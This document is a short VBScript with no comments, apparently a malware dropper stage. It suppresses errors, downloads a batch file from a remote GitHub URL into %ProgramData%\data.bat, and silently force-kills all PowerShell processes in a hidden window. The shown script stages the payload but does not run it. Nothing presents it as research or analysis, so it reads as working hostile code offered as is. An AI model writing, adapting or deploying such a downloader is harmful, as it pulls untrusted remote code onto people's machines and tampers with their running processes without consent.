On Error Resume Next
Dim objShell, objFSO, strProgramData, strBatFile, strURL
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strProgramData = objShell.ExpandEnvironmentStrings("%ProgramData%")
strBatFile = strProgramData & "\data.bat"
strURL = "https://raw.githubusercontent.com/bat2exe/Kematian/refs/heads/main/d.bat"
If objFSO.FileExists(strBatFile) Then
    objFSO.DeleteFile strBatFile, True
End If
Dim objHTTP
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
objHTTP.Open "GET", strURL, False
objHTTP.Send
If objHTTP.Status = 200 Then
    Dim objStream
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 'adTypeBinary
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile strBatFile, 2 'adSaveCreateOverWrite
    objStream.Close
    Set objStream = Nothing
End If
objShell.Run "taskkill /F /IM powershell.exe", 0, False
Set objHTTP = Nothing
Set objFSO = Nothing
Set objShell = Nothing
